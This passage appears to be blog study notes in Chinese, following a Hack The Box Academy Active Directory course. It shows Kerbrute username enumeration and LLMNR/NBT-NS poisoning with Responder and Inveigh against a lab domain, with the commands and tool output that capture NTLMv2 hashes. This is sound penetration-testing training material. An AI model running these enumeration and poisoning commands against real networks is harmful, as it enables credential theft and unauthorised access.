可以是域帐户枚举的一个更隐蔽的选项。它利用了这样一个事实，即Kerberos预身份验证失败通常不会触发日志或警报。我们将把Kerbrute与Insidetrust的jsmith.txt或jsmith2.txt用户列表结合使用。此存储库包含许多不同的用户列表，当从未经身份验证的角度开始枚举用户时，这些列表非常有用。我们可以将Kerbrute指向我们之前找到的DC，并为其提供一个单词列表。该工具很快，我们将收到结果，让我们知道找到的账户是否有效，这是发起密码喷涂等攻击的一个很好的起点，我们将在本模块稍后深入介绍。 为了开始使用Kerbrute，我们可以从Linux、Windows和Mac下载用于测试工具的预编译二进制文件，也可以自己编译。这通常是我们在客户端环境中引入的任何工具的最佳实践。要编译二进制文件以在我们选择的系统上使用，我们首先克隆repo：</p><h4 id="Cloning-Kerbrute-GitHub-Repo"><a href="#Cloning-Kerbrute-GitHub-Repo" class="headerlink" title="Cloning Kerbrute GitHub Repo"></a>Cloning Kerbrute GitHub Repo</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git</code></pre><p>键入make help将向我们显示可用的编译选项。</p><pre><code class="shell-session">Tanin@htb[/htb]$ make helphelp:            Show this help.windows:  Make Windows x86 and x64 Binarieslinux:  Make Linux x86 and x64 Binariesmac:  Make Darwin (Mac) x86 and x64 Binariesclean:  Delete any binariesall:  Make Windows, Linux and Mac x86/x64 Binaries</code></pre><p>我们可以选择只编译一个二进制文件或类型make all，并分别编译一个用于Linux、Windows和Mac系统（每个系统都有x86和x64版本）。</p><p>新创建的dist目录将包含我们编译的二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls dist/kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe</code></pre><h4 id="Testing-the-kerbrute-linux-amd64-Binary"><a href="#Testing-the-kerbrute-linux-amd64-Binary" class="headerlink" title="Testing the kerbrute_linux_amd64 Binary"></a>Testing the kerbrute_linux_amd64 Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./kerbrute_linux_amd64     __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnopThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accountsUsage:  kerbrute [command]    &lt;SNIP&gt;</code></pre><p>我们可以将该工具添加到我们的PATH中，使其可以从主机上的任何位置轻松访问。</p><h4 id="Adding-the-Tool-to-our-Path"><a href="#Adding-the-Tool-to-our-Path" class="headerlink" title="Adding the Tool to our Path"></a>Adding the Tool to our Path</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools</code></pre><h4 id="Moving-the-Binary"><a href="#Moving-the-Binary" class="headerlink" title="Moving the Binary"></a>Moving the Binary</h4><pre><code class="shell-session">sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></pre><h4 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users2021/11/17 23:01:46 &gt;  Using KDC(s):2021/11/17 23:01:46 &gt;   172.16.5.5:882021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL2021/11/17 23:01:50 &gt;  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL &lt;SNIP&gt; 2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL2021/11/17 23:01:52 &gt;  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL2021/11/17 23:01:56 &gt;  Done! Tested 48705 usernames (56 valid) in 9.940 seconds</code></pre><h2 id="Identifying-Potential-Vulnerabilities"><a href="#Identifying-Potential-Vulnerabilities" class="headerlink" title="Identifying Potential Vulnerabilities"></a>Identifying Potential Vulnerabilities</h2><p>本地系统帐户NT AUTHORITY\system是Windows操作系统中的内置帐户。它在操作系统中具有最高级别的访问权限，用于运行大多数Windows服务。默认情况下，第三方服务在该帐户的上下文中运行也是非常常见的。加入域的主机上的SYSTEM帐户将能够通过模拟计算机帐户来枚举Active Directory，而计算机帐户本质上只是另一种用户帐户。在域环境中拥有SYSTEM级别的访问权限几乎相当于拥有域用户帐户。 有几种方法可以在主机上获得SYSTEM级别的访问权限，包括但不限于： 远程Windows漏洞利用，如MS08-067、EternalBlue或BlueKeep。 滥用在SYSTEM帐户上下文中运行的服务，或使用<a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>滥用服务帐户SeImpersonate权限。这种类型的攻击在旧的Windows操作系统上是可能的，但在Windows Server 2019上并不总是可能的。 Windows操作系统中的本地权限提升缺陷，如Windows 10任务计划程序0天。 使用本地帐户在加入域的主机上获得管理员访问权限，并使用Psexec启动SYSTEM cmd窗口 通过在加入域的主机上获得SYSTEM级别的访问权限，您将能够执行以下操作，但不限于： 使用内置工具或攻击性工具（如BloodHound和PowerView）枚举域。 在同一域内执行Kerberoasting&#x2F;ASREPRoasting攻击。 运行Inveigh等工具来收集Net-NTLMv2哈希或执行SMB中继攻击。 执行令牌模拟以劫持特权域用户帐户。 执行ACL攻击。</p><h1 id="Sniffing-out-a-Foothold"><a href="#Sniffing-out-a-Foothold" class="headerlink" title="Sniffing out a Foothold"></a>Sniffing out a Foothold</h1><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Linux"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Linux" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Linux"></a>LLMNR&#x2F;NBT-NS Poisoning - from Linux</h1><p>在这个阶段，我们将同时使用两种不同的技术：网络中毒和密码喷洒。我们将执行这些操作，目的是为域用户帐户获取有效的明文凭据，从而使我们在域中有一个立足点，从认证的角度开始下一阶段的枚举。</p><p>收集凭据并在评估过程中获得初步立足点的常见方法：对链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）广播的中间人攻击。根据网络的不同，此攻击可能提供低特权或管理级别的密码哈希，这些哈希可以离线破解，甚至可以是明文凭据。这些哈希有时也可用于执行SMB中继攻击，以向具有管理权限的域中的一台或多台主机进行身份验证，而无需离线破解密码哈希。</p><h2 id="LLMNR-amp-NBT-NS-Primer"><a href="#LLMNR-amp-NBT-NS-Primer" class="headerlink" title="LLMNR &amp; NBT-NS Primer"></a>LLMNR &amp; NBT-NS Primer</h2><p>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）是Microsoft Windows组件，用作DNS失败时可以使用的主机标识的替代方法。如果一台机器试图解析主机，但DNS解析失败，通常情况下，该机器会尝试通过LLMNR向本地网络上的所有其他机器询问正确的主机地址。LLMNR基于域名系统（DNS）格式，并允许同一本地链路上的主机为其他主机执行名称解析。它本机使用UDP上的端口&#x3D;&#x3D;5355&#x3D;&#x3D;。如果LLMNR失败，将使用NBT-NS。NBT-NS通过其NetBIOS名称识别本地网络上的系统。&#x3D;&#x3D;NBT-NS通过UDP利用端口137&#x3D;&#x3D;。 这里的关键是，当LLMNR&#x2F;NBT-NS用于名称解析时，网络上的任何主机都可以回复。这就是我们使用Responder来毒害这些请求的地方。通过网络访问，我们可以通过响应LLMNR和NBT-NS流量来欺骗广播域中的权威名称解析源（在这种情况下，是指应该属于网段的主机），就好像它们有请求主机的答案一样。这种中毒行为是为了让受害者通过假装我们的流氓系统知道请求主机的位置来与我们的系统通信。如果请求的主机需要名称解析或身份验证操作，我们可以捕获NetNTLM哈希，并对其进行离线暴力攻击，试图检索明文密码。捕获的身份验证请求也可以被中继以访问另一台主机，或者针对同一台主机上的不同协议（如LDAP）使用。LLMNR&#x2F;NBNS欺骗加上缺乏SMB签名，通常会导致对域内主机的管理访问。SMB中继攻击将在稍后的关于横向移动的模块中介绍。</p><h2 id="Quick-Example-LLMNR-x2F-NBT-NS-Poisoning"><a href="#Quick-Example-LLMNR-x2F-NBT-NS-Poisoning" class="headerlink" title="Quick Example - LLMNR&#x2F;NBT-NS Poisoning *"></a>Quick Example - LLMNR&#x2F;NBT-NS Poisoning *</h2><p>让我们从一个非常高的层面来简要介绍一下攻击流程的示例： 主机试图连接到位于\print01.inlanefreight.local的打印服务器，但意外键入\printer01.inlanefleight.local。 DNS服务器响应，声明此主机未知。 然后，主机向整个本地网络广播，询问是否有人知道\printer01.inlanefreight.local的位置。 攻击者（我们运行的是Responder）响应主机，指出主机正在查找\printer01.inlanefreight.local。 主机相信此回复，并使用用户名和NTLMv2密码哈希向攻击者发送身份验证请求。 如果存在正确的条件，则可以脱机破解此哈希，或将其用于SMB中继攻击。</p><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.</td></tr></tbody></table><p>我们通常使用Linux攻击主机从客户端内部网络上的匿名位置开始进行内部渗透测试。像Responder这样的工具非常适合建立一个立足点，我们稍后可以通过进一步的枚举和攻击来扩展它。Responder是用Python编写的，通常用于Linux攻击主机，但也有适用于Windows的.exe版本。Inveigh同时使用C#和PowerShell编写（被认为是遗留版本）。这两种工具都可以用来攻击以下协议：</p><ul><li>LLMNR</li><li>DNS</li><li>MDNS</li><li>NBNS</li><li>DHCP</li><li>ICMP</li><li>HTTP</li><li>HTTPS</li><li>SMB</li><li>LDAP</li><li>WebDAV</li><li>Proxy Auth</li></ul><p>Responder also has support for:</p><ul><li>MSSQL</li><li>DCE-RPC</li><li>FTP, POP3, IMAP, and SMTP auth</li></ul><h3 id="Responder-In-Action"><a href="#Responder-In-Action" class="headerlink" title="Responder In Action *"></a>Responder In Action *</h3><p>让我们通过在控制台中键入responser-h来查看一些可用的选项。</p><p>如模块前面所示，-A标志使我们进入分析模式，使我们能够在环境中查看NBT-NS、BROWSER和LLMNR请求，而不会破坏任何响应。我们必须始终提供接口或IP。我们通常想要使用的一些常见选项是-wf；这将启动WPAD rogue代理服务器，而-f将尝试对远程主机操作系统和版本进行指纹识别。如果遇到问题，我们可以使用-v标志来增加详细程度，但这将导致大量额外的数据打印到控制台。其他选项（如-F和-P）可用于强制NTLM或基本身份验证和强制代理身份验证，但可能会导致登录提示，因此应谨慎使用。-w标志的使用利用了内置的WPAD代理服务器。这可能非常有效，尤其是在大型组织中，因为如果浏览器启用了“自动检测”设置，它将捕获启动Internet Explorer的任何用户的所有HTTP请求。</p><p>使用上面显示的配置，响应程序将侦听并回答它在线路上看到的任何请求。如果成功并成功捕获了哈希，Responder将在屏幕上打印出来，并将其写入&#x2F;usr&#x2F;share&#x2F;resporter&#x2F;logs目录中的每个主机的日志文件中。哈希以（MODULE_NAME）-（HASH_TYPE）-（CLIENT_IP）.txt格式保存，除非启用-v模式，否则一个哈希将打印到控制台并存储在其关联的日志文件中。例如，日志文件可能类似于SMB-NTLMv2-SP-172.16.5.25。哈希也存储在SQLite数据库中，该数据库可以在Responder.conf配置文件中配置，通常位于&#x2F;usr&#x2F;share&#x2F;resporter中，除非我们直接从GitHub克隆Responder repo。 我们必须以sudo权限或root身份运行该工具，并确保攻击主机上有以下端口可用，使其发挥最佳功能：</p><pre><code class="shell-session">UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353</code></pre><h4 id="Responder-Logs"><a href="#Responder-Logs" class="headerlink" title="Responder Logs"></a>Responder Logs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsAnalyzer-Session.log                Responder-Session.logConfig-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txtHTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txtPoisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txtProxy-Auth-NTLMv2-172.16.5.200.txt</code></pre><h4 id="Starting-Responder-with-Default-Settings"><a href="#Starting-Responder-with-Default-Settings" class="headerlink" title="Starting Responder with Default Settings"></a>Starting Responder with Default Settings</h4><pre><code class="bash">sudo responder -I ens224 </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309232006463.png" alt="image"></p><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Windows"></a>LLMNR&#x2F;NBT-NS Poisoning - from Windows</h1><p>本节将探讨 <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>工具，并尝试捕获另一组凭据。</p><h2 id="Inveigh-Overview"><a href="#Inveigh-Overview" class="headerlink" title="Inveigh - Overview"></a>Inveigh - Overview</h2><p>工具Inveigh的工作原理与Responder类似，但使用PowerShell和C#编写。Inveigh可以监听IPv4和IPv6以及其他几种协议，包括LLMNR、DNS、mDNS、NBNS、DHCPv6、ICMPv6、HTTP、HTTPS、SMB、LDAP、WebDAV和代理身份验证。</p><h2 id="Using-Inveigh"><a href="#Using-Inveigh" class="headerlink" title="Using Inveigh"></a>Using Inveigh</h2><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\Inveigh.ps1PS C:\htb&gt; (Get-Command Invoke-Inveigh).Parameters</code></pre><p>让我们从LLMNR和NBNS欺骗开始Inveigh，然后输出到控制台并写入文件。我们将保留其余的默认值，这可以在这里看到 <a href="https://github.com/Kevin-Robertson/Inveigh#parameter-help">here</a>。</p><pre><code class="powershell-session">PS C:\htb&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y[*] Inveigh 1.506 started at 2022-02-28T19:26:30[+] Elevated Privilege Mode = Enabled[+] Primary IP Address = 172.16.5.25[+] Spoofer IP Address = 172.16.5.25[+] ADIDNS Spoofer = Disabled[+] DNS Spoofer = Enabled[+] DNS TTL = 30 Seconds[+] LLMNR Spoofer = Enabled[+] LLMNR TTL = 30 Seconds[+] mDNS Spoofer = Disabled[+] NBNS Spoofer For Types 00,20 = Enabled[+] NBNS TTL = 165 Seconds[+] SMB Capture = Enabled[+] HTTP Capture = Enabled[+] HTTPS Certificate Issuer = Inveigh[+] HTTPS Certificate CN = localhost[+] HTTPS Capture = Enabled[+] HTTP/HTTPS Authentication = NTLM[+] WPAD Authentication = NTLM[+] WPAD NTLM Authentication Ignore List = Firefox[+] WPAD Response = Enabled[+] Kerberos TGT Capture = Disabled[+] Machine Account Capture = Disabled[+] Console Output = Full[+] File Output = Enabled[+] Output Directory = C:\ToolsWARNING: [!] Run Stop-Inveigh to stop[*] Press any key to stop console outputWARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listenerWARNING: [!] [2022-02-28T19:26:31] Exception calling &quot;Start&quot; with &quot;0&quot; argument(s): &quot;An attempt was made to access asocket in a way forbidden by its access permissions&quot; $HTTP_listener.Start()[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834&lt;SNIP&gt;</code></pre><p>我们可以看到，我们立即开始获取LLMNR和mDNS请求。下面的动画显示了该工具的作用。</p><p><img src="https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png" alt="image"></p><h2 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h2><p>Invenigh的PowerShell版本是原始版本，不再更新。工具作者维护C#版本，该版本结合了原始PoC C#代码和PowerShell版本中大部分代码的C#端口。在我们可以使用C#版本的工具之前，我们必须编译可执行文件</p><pre><code class="powershell-session">PS C:\htb&gt; .\Inveigh.exe</code></pre><pre><code class="powershell-session">[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276][+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Listener Addresses [IP 0.0.0.0 | IPv6 ::][+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Spoofer Options [Repeat Enabled | Local Attacks Disabled][ ] DHCPv6[+] DNS Packet Sniffer [Type A][ ] ICMPv6[+] LLMNR Packet Sniffer [Type A][ ] MDNS[ ] NBNS[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80][ ] HTTPS[+] WebDAV [WebDAVAuth NTLM][ ] Proxy[+] LDAP Listener [Port 389][+] SMB Packet Sniffer [Port 445][+] File Output [C:\Tools][+] Previous Session Files (Not Found)[*] Press ESC to enter/exit interactive console[!] Failed to start HTTP listener on port 80, check IP and port usage.[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]</code></pre><p>正如我们所看到的，该工具启动并显示哪些选项默认启用，哪些选项未启用。带[+]的选项是默认的，默认情况下是启用的，之前带[]的选项是禁用的。正在运行的控制台输出还向我们显示了哪些选项被禁用，因此不会发送响应（上例中为mDNS）。我们还可以看到消息Press ESC to enter&#x2F;exit interactive console，这在运行该工具时非常有用。控制台允许我们访问捕获的凭据&#x2F;哈希，允许我们停止Inveigh等。</p><p>我们可以在Inveigh运行时按esc键进入控制台。</p><pre><code class="powershell-session">&lt;SNIP&gt;[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311C(0:0) NTLMv1(0:0) NTLMv2(3:9)&gt; HELP</code></pre><p>在键入HELP并点击enter后，我们将看到几个选项：</p><pre><code class="powershell-session">=============================================== Inveigh Console Commands ===============================================Command                           Description========================================================================================================================GET CONSOLE                     | get queued console outputGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addressesGET LOG                         | get log entries; add search string to filter resultsGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter resultsGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter resultsGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter resultsGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter resultsGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashesGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashesGET CLEARTEXT                   | get captured cleartext credentialsGET CLEARTEXTUNIQUE             | get unique captured cleartext credentialsGET REPLYTODOMAINS              | get ReplyToDomains parameter startup valuesGET REPLYTOHOSTS                | get ReplyToHosts parameter startup valuesGET REPLYTOIPS                  | get ReplyToIPs parameter startup valuesGET REPLYTOMACS                 | get ReplyToMACs parameter startup valuesGET IGNOREDOMAINS               | get IgnoreDomains parameter startup valuesGET IGNOREHOSTS                 | get IgnoreHosts parameter startup valuesGET IGNOREIPS                   | get IgnoreIPs parameter startup valuesGET IGNOREMACS                  | get IgnoreMACs parameter startup valuesSET CONSOLE                     | set Console parameter valueHISTORY                         | get command historyRESUME                          | resume real time console outputSTOP                            | stop Inveigh</code></pre><p>我们可以通过键入GET NTLMV2UNIQUE快速查看捕获的唯一哈希。</p><p>我们可以键入GET NTLMV2USERNAMES并查看我们收集了哪些用户名。如果我们想要一个用户列表来执行额外的枚举，并查看哪些值得尝试使用Hashcat离线破解，这将非常有用。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sniffing out a Foothold&lt;/li&gt;
&lt;li&gt;Initial Enumeration&lt;/li&gt;
&lt;li&gt;Sniffing out a Foothold&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
</feed>
